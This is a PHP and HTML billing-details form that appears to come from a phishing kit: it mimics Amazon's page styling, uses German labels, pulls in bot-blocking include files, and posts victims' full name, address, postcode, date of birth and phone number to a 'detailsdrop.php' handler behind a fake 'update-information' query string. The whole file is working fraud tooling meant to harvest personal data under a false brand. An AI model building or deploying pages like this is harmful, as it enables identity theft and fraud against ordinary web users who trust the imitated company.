<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include('../banned.php');?>
<!-- HTML INPUTS FOR BILING PAGE -->
<!-- CODE STARTS HERE -->
<script type="text/javascript">
  function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script><script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<form method="post" action="detailsdrop.php?cmd=_update-information&account_card=<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>">
  <div class="a-row a-spacing-top-base">
    <ul class="a-nostyle a-horizontal a-spacing-none">
      <li>
        <?php  ################################################################################################################################### ?>
        <span class="a-list-item">
          <label for="pmts-id-10" class="pmts-form-label">Vollständiger Name *
          </label>
        </span>
      </li>
    </ul>
    <input type="text" onkeydown="upperCaseF(this)" autocomplete="off" required="" title="Bitte geben Sie einen gültigen Namen ein" placeholder="Vollständiger Name" pattern="[A-Za-z].{6,}" maxlength="20" id="full_name" name="full_name" size="30">
    <br>
    <span id="pmts-id-11">
    </span>
  </div>
  <?php  ################################################################################################################################### ?>
  <div class="a-row a-spacing-top-base">
    <ul class="a-nostyle a-horizontal a-spacing-none">
      <li>
        <span class="a-list-item">
          <label for="pmts-id-12" class="pmts-form-label">Adresszeile *
          </label>
        </span>
      </li>
    </ul>
    <input type="text" maxlength="50" required="" autocomplete="off" id="add_1" title="Bitte geben Sie eine gültige Adresszeile ein" placeholder="Straße, P.O. Box, Firmenname." name="add_1" size="30">
    <br>
    <span id="pmts-id-13">
    </span>
  </div>
  <?php  ################################################################################################################################### ?>
  <div class="a-row a-spacing-top-base">
    <ul class="a-nostyle a-horizontal a-spacing-none">
      <li>
        <span class="a-list-item">
          <label for="pmts-id-12" class="pmts-form-label">Adresszeile 2  *
          </label>
        </span>
      </li>
    </ul>
    <input type="text" maxlength="50" autocomplete="off" placeholder="Wohnung, Suite, Einheit, Gebäude, Etage usw." id="add_2" name="add_2" size="30">
    <br>
    <span id="pmts-id-13">
    </span>
  </div>
  </div>
<?php  ################################################################################################################################### ?>
<div class="a-row a-spacing-top-base">
  <span>
    <label>Stadt *
    </label>
  </span>
  <input type="text" placeholder="Stadt" required="" autocomplete="off" title="Bitte geben Sie einen gültigen Städtenamen ein" maxlength="30" size="30" id="city" name="city" >
  <br>
  <span id="pmts-id-13">
  </span>
</div>
<?php  ################################################################################################################################### ?>
<div class="a-row a-spacing-top-base">
  <ul class="a-nostyle a-horizontal a-spacing-none">
    <li>
      <span class="a-list-item">
        <label for="pmts-id-12" class="pmts-form-label">Region *
        </label>
      </span>
    </li>
  </ul>
  <input type="text" maxlength="50" id="state" required="" autocomplete="off" title="Bitte geben Sie einen gültigen Regionsnamen ein" placeholder="Region" name="state" size="30">
  <br>
  <span id="pmts-id-13">
  </span>
</div>
<?php  ################################################################################################################################### ?>
<div class="a-row a-spacing-top-base">
  <ul class="a-nostyle a-horizontal a-spacing-none">
    <li>
      <span class="a-list-item">
        <label for="pmts-id-12" class="pmts-form-label">Postleitzahl *
        </label>
      </span>
    </li>
  </ul>
  <input type="tel" maxlength="8" required="" autocomplete="off" title="Tragen Sie eine gueltige Postleitzahl ein" id="ZIP" placeholder="Postleitzahl" name="ZIP" size="30">
  <br>
  <span id="pmts-id-13">
  </span>
</div>
      <?php  ################################################################################################################################### ?>
<script type="text/javascript">
        function addSlashes(input) {
          var v = input.value;
          if (v.match(/^\d{2}$/) !== null) {
            input.value = v + '/';
          }
          else if (v.match(/^\d{2}\/\d{2}$/) !== null) {
            input.value = v + '/';
          }
        }
</script>
<script src="../data/js/jquery.js" type="text/javascript"></script><script src="../data/js/jquery.min.mask.js" type="text/javascript"></script><script src="../data/js/jquery.maskedinput.js" type="text/javascript"></script>
      <?php 
if ($COUNTRYCODE=="US" or $COUNTRYCODE=="FSM"){ echo '
<script type="text/javascript">
jQuery(function($){
$("#DOB").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
});
</script>
';}
else { echo '
<script type="text/javascript">
jQuery(function($){
$("#DOB").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
});
</script>
';}
?>			
      <script type="text/javascript">
        jQuery(function($){
          $("#phone").mask("(999) 999-9999");
        }
              );
      </script>
	  <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title">Land *
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" readonly id="asv-allowances-title" value="" autocomplete="off" class="a-declarative a-input-text" placeholder="<?php  echo $COUNTRYNAME; ?>" >
      </div>
      <?php  ################################################################################################################################### ?>
      <div class="a-row a-spacing-top-base">
        <ul class="a-nostyle a-horizontal a-spacing-none">
          <li>
            <span class="a-list-item">
              <label for="pmts-id-12" class="pmts-form-label">Geburtsdatum *
              </label>
              <input type="tel" required="" autocomplete="off" title="Please Enter a valid Date of Birth" 
                     placeholder="<?php if ($COUNTRYCODE=="US"){ echo 'MM/DD/YYYY';} else { echo 'DD/MM/YYYY';}?>" id="DOB" name="DOB" class="DOB" size="30">
              <br>
              <span id="pmts-id-13">
              </span>
              </div>
            <?php  ################################################################################################################################### ?>
            <div class="a-row a-spacing-top-base">
              <ul class="a-nostyle a-horizontal a-spacing-none">
                <li>
                  <span class="a-list-item">
                    <label for="pmts-id-12" class="pmts-form-label">Telefonnummer *
                    </label>
                  </span>
                </li>
              </ul>
              <input type="tel" required="" autocomplete="off" id="phone" title="Please Enter a valid Phone number" placeholder="Phone number" name="phone" size="30">
              <br>
              <span id="pmts-id-13">
              </span>
            </div>
            <?php  ################################################################################################################################### ?>
            <div class="a-box a-spacing-top-base a-width-large pmts_box_without_border">
              <div class="a-box-inner a-padding-none">
                    
                  </span>
                </span>
                <span id="pmts-id-22" class="a-button a-button-primary">
                  <span class="a-button-inner">
                    <button class="a-button-text" id="submit"  type="submit">Speichern und fortfahren
                    </button>
                  </span>
                </span>
              </div>
            </div>
          </div>
      </div>
    </div>
</div>
</div>
</div>
</div>
</div>
</div>
</form>
<!-- CODE ENDS HERE -->
